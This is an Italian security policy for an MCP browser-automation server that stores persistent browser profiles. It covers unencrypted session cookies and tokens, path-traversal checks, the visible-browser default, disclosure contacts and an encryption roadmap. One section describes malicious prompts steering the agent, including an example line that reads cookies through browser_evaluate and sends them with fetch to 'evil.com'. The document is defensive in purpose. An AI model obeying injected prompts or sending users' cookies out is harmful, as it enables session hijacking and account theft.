# Security

## Modello di threat

`mysupportdetails-mcp` gestisce **profili browser persistenti** che contengono:
- Cookie di sessione (token login attivi)
- localStorage (JWT, refresh token)
- IndexedDB
- Cache HTTP (spesso include immagini, response API)
- Cronologia navigazione

**Chi ha lettura del filesystem locale ha accesso completo a tutto quanto sopra**, come per il profilo Chrome/Firefox di sistema.

## Cosa NON facciamo (per scelta, v0.x)

- **Nessuna crittografia at-rest**: i file sotto `~/.msd/profiles/` sono in chiaro. Un attaccante con lettura del filesystem può:
  - Copiare la cartella cookie e rigiocare le sessioni su un'altra macchina
  - Estrarre token JWT da localStorage
  - Fare hijack di sessioni SSO
- **Nessun sandboxing extra oltre a quello nativo del browser**: le pagine navigate hanno gli stessi privilegi di una normale sessione Chrome/Firefox.
- **Nessuna audit trail delle azioni MCP**: chi ha lanciato quale tool, quando, con quali parametri, non viene loggato.

Le scelte sopra sono **intenzionali per il MVP**. Vedi ROADMAP.md per feature encryption v2 opt-in.

## Cosa facciamo

### Browser SEMPRE visibile di default (security-first)

Il browser si apre in modalita' **headed** (finestra visibile) di default. Non e' una scelta di UX, e' una scelta di sicurezza:

- **L'utente vede in tempo reale cosa fa l'agente**. Se un prompt malevolo indirizza il browser verso un sito phishing, l'utente lo vede subito e killa.
- **Nessuna esecuzione silent**. Nessun rischio che l'agente compili form / clicchi bottoni / accetti cookie banner in background senza consenso visivo.
- **Debug immediato**. Errori Playwright, popup imprevisti, redirect strani sono visibili senza dover riabilitare screenshot dopo il fatto.

L'opt-in a headless (env var `MSD_HEADLESS=1` o parametro tool call `headed: false`) e' documentato ma **richiede azione esplicita dell'utente**. Non c'e' modo di attivarlo tramite prompt malevolo perche' non e' un tool exposed ne' un flag di config runtime.

Il valore default `headed: true` e' protetto da test unit obbligatorio in CI (vedi ARCHITECTURE.md).

### Confinamento path
`profile-store.resolvePath(browser, name)` valida che il nome del profilo:
- non contenga `..`, `/`, `\`, `\0`
- matchi regex `^[a-zA-Z0-9._-]{1,64}$`
- il path risolto (post realpath) sia sotto `~/.msd/profiles/`

Impedisce che un prompt malevolo dell'agente scriva fuori dal profile store (path traversal).

### Nessun eval di prompt sensibili
- `browser_evaluate` esegue JS **nel contesto della pagina web caricata**, non nel processo Node del server. Isolamento del browser sandbox rispettato.
- I parametri dei tool sono validati con Zod schema prima di essere passati a Playwright.

### Isolamento tra profili
Ogni profilo ha una dir Playwright separata. Cookie, cache, storage isolati at-filesystem-level. Nessuna cross-contamination.

### Best practice consigliate all'utente

Nel README + prompt iniziale che mostriamo alla prima esecuzione:

```
IMPORTANTE:
- mysupportdetails-mcp salva cookie e sessioni browser in chiaro sotto ~/.msd/.
- Non usare su macchine condivise senza disk encryption.
- Non salvare in un profilo mysupportdetails-mcp credenziali critiche (banking, azienda,
  admin panel di produzione).
- Un profilo mysupportdetails-mcp e' equivalente a un profilo Chrome/Firefox: chi legge
  il filesystem ha accesso al tuo login attivo.
- Per casi security-sensitive, aspetta la feature encryption opt-in v2.0.
```

### Cosa impedisce a un prompt malevolo di

**Estrarre cookie e mandarli a un server remoto**
Un prompt che chiede all'agente di leggere cookie via `browser_evaluate` + `fetch("evil.com", {body: cookies})` funzionerebbe **se il sito visitato lo permette da JS della pagina**. Questo è isolamento cross-origin del browser: `document.cookie` accessibile solo dal dominio proprietario del cookie. `HttpOnly` cookies non leggibili nemmeno da JS.

Non è un difetto di mysupportdetails-mcp — è il modello di sicurezza standard del web.

**Cancellare profili altrui**
Il tool `profile_delete` è callable ma agisce solo su path sotto `~/.msd/profiles/`. Impossibile toccare filesystem esterno via questo tool.

**Uploadare file arbitrari a un sito**
`browser_type` inserisce testo, non file. Upload richiederebbe implementazione futura di `browser_file_upload` (non presente in v0.1.0). Quando/se lo aggiungiamo, il path del file da uploadare sarà validato.

## Cross-platform note

### macOS
- Playwright download binari da Microsoft CDN al primo `install`. Verifica firma bundled.
- Il profilo Chrome/Firefox è ~/Library/Application Support/Google/Chrome — mysupportdetails-mcp NON tocca quel path.

### Linux
- Se hai `SELinux` in enforcing, potrebbe bloccare Playwright headed. Whitelist il context Node.
- Sandbox namespace: Chromium richiede `--no-sandbox` in alcune configurazioni CI. Flag disponibile ma sconsigliato in dev.

### Windows
- Windows Defender può marcare Chromium Playwright bundled come sospetto al primo download. Aggiungi eccezione per `%USERPROFILE%\.cache\ms-playwright`.
- Path separator `\` gestito da Node — mysupportdetails-mcp non hardcoda mai `/`.

## Segnalazione vulnerabilità

Vulnerabilità di sicurezza vanno inviate privatamente a: `security@kuramalab.dev` (email da configurare).

Non aprire issue pubbliche per vulnerabilità.

Risposta target: 48h prima triage, patch entro 7 giorni per HIGH/CRITICAL.

## Roadmap encryption v2

Feature opt-in `--encrypt`:
- AES-256-GCM su tutti i file del profilo at-rest
- Chiave master in OS keychain nativo:
  - macOS: Keychain Services
  - Linux: `libsecret` (GNOME Keyring / KDE Wallet)
  - Windows: DPAPI (Credential Manager)
- Sblocco automatico se utente ha sessione OS attiva
- Fallback prompt password all'apertura profilo

Non nel MVP per non ritardare launch. Priorità v2.0.
